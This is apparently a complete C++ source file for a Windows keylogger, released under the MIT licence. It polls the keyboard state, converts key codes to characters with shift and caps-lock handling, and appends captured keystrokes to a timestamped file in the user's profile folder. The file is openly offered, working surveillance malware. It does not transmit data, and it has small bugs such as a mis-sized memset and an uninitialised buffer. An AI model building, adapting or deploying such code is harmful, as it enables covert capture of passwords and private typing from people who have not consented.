/*
Windows_Key_Logger https://github.com/Androsh7/Windows_Key_Logger
by Androsh7

MIT License

Copyright (c) 2024 Androsh7

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <iostream>
#include <Windows.h>
#include <winuser.h>
#include <stdio.h>
#include <fstream>
#include <string>
#include <Lmcons.h>
#include <array>
#include <stdexcept>
#include <memory>
using namespace std;

#define winlen 51

// windows key codes
const char winkeylist[] = { '\b', '\t', '\n', ' ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ';', '=', ',', '-', '.', '/', '`' ,'[', '\\', ']', '\''};
const char altkeylist[] = { '\b', '\t', '\n', ' ', ')', '!', '@', '#', '$', '%', '^', '&', '*', '(', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ':', '+', '<', '_', '>', '?', '~' , '{', '|' , '}', '\"'};
const int wincodelist[] = { 8,    9,    13,   32,  48,  49,  50,  51,  52,  53,  54,  55,  56,  57,  65,  66,  67,  68,  69,  70,  71,  72,  73,  74,  75,  76,  77,  78,  79,  80,  81,  82,  83,  84,  85,  86,  87,  88,  89,  90,  186, 187, 188, 189, 190, 191, 192, 219, 220, 221, 222 };

// executes a console command and returns it's output
string exec(string incmd) {
	const char* cmd = incmd.c_str();
	array<char, 128> buffer;
	string result;
	unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
	if (!pipe) {
		throw runtime_error("popen() failed!");
	}
	while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	return result;
}

char getwinkey(int wincode, bool alt = false) {
	for (int i = 0; i < winlen; i++) {
		if (wincode == wincodelist[i]) {
			if (alt) return altkeylist[i];
			else return winkeylist[i];
		}
	}
	return NULL;
}

string getUsername() {
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;

	if (GetUserNameA(username, &username_len)) {
		return string(username);
	}
	else {
		std::cerr << "Error getting username.\n";
		return "ERROR";
	}
}

string getTimestamp() {
	string outstr = "";
	SYSTEMTIME str_t;
	GetSystemTime(&str_t);
	outstr += to_string(str_t.wYear);
	outstr += to_string(str_t.wMonth);
	outstr += to_string(str_t.wDay);
	outstr += "-";
	outstr += to_string(str_t.wMinute);
	outstr += to_string(str_t.wSecond);
	return outstr;
}

int main()
{
	// get the path for the users document folder
	
	
	string logpath;
	string homepath = exec("echo|set /p=\"%USERPROFILE%\"");
	exec("mkdir " + homepath + "\\LogData");
	logpath = homepath + "\\LogData\\" + getTimestamp() + ".txt";

	int temp;
	BYTE arr[256];
	BYTE arr_prev[256];
	bool shift = false;

	string outstring = "";
	int repetitions = 0;

	while (1)
	{
		// get status of shift key
		if (GetKeyState(VK_SHIFT) <= -127) {
			//cout << "SHIFT = TRUE" << endl;
			shift = true;
		}
		else shift = false;

		// gets current key presses and writes them to outstring
		memset(arr, 0, sizeof(256));
		GetKeyState(0);
		if (GetKeyboardState(arr))
		{
			for (int i = 0; i < 256; i++)
			{
				temp = (int)arr[i];
				temp >>= 7;
				if (temp == 1 && arr[i] != arr_prev[i] && getwinkey(i) != NULL) {
					if ((shift xor (int)arr[VK_CAPITAL])) {
						outstring += getwinkey(i, true);
						//cout << getwinkey(i, true);
					}
					else {
						outstring += getwinkey(i, false);
						//cout << getwinkey(i, false);
					}
				}
			}
			Sleep(40);
		}
		for (int i = 0; i < 256; i++) {
			arr_prev[i] = arr[i];
		}

		// writes the logs to a file
		if (!(repetitions % 1500)) {
			if (outstring != "" || repetitions == 0) {
				ofstream fout(logpath, std::ios::app);
				if (fout.is_open()) {
					cout << "WROTE " << outstring.size() << " BYTES TO " << logpath << endl;
					if (repetitions == 0) {
						fout << "\n" << getTimestamp() << "\n";
						fout << "user1::amazon\n";
						fout << "user2::amazon\n";
							
					}
					fout << outstring;
					outstring = "";
					fout.close();
				}
				else {
					cerr << "Could not open " << logpath << endl;
				}
			}
		}
		repetitions = (repetitions + 1) % 7500;
	}

}
